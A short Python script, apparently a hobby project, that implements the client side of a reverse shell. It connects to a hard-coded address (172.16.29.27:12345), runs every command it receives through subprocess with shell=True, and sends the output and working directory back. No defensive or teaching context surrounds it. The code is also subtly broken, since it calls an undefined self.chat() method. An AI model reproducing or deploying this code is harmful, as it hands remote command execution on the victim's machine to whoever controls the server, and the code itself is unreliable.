import  socket , threading
import  sys
import os
import subprocess
class clinet :
    def __init__(self,server_add,server_port):
        self.s=socket.socket()
        self.host='172.16.29.27'    # ow this ffor testing
        self.port=12345 # to the port where request will be sent same as server.py
    
    def connect_socket(self):
        try :
            self.s.connect((self.host,self.port))
            print("connected to the server successfully .")
            self.chat()
            self.send_request()
        except socket.error as msg :
            print("failed to connect to "+ self.host)
            sys.exit(1)
    
    def send_request(self):
        while True :
            data=self.s.recv(3000)
            if data[:2].decode("utf-8")=="cd" :
                os.chdir(data[3:].decode("utf-8"))
            if len(data)>0 :
                result= subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                output_byte= result.stdout.read() + result.stderr.read()
                output_str= str(output_byte,"utf-8") #printing the result in the cliebnt computer

                self.s.send(str.encode(os.getcwd()+">")+str.encode(output_str)) #sending op with the currnet working fdirectorty
                print(output_str)

c1=clinet("dont know",12345)
c1.connect_socket()





